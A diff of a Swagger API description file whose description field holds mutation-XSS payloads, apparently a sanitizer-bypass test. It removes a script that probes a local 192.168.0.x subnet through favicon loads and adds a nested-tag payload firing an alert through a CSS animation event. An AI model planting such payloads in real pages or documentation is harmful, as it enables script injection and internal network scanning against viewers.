@@ -2,17 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
-    <script>
-     for (let i = 0; i < 256; i++) {
-      let ip = '192.168.0.' + i
-
-      let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
-      document.body.innerHTML += code
-     }
-    </script>
-
-    "></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>"></form>
 
   version: production
 basePath: /JSSResource/
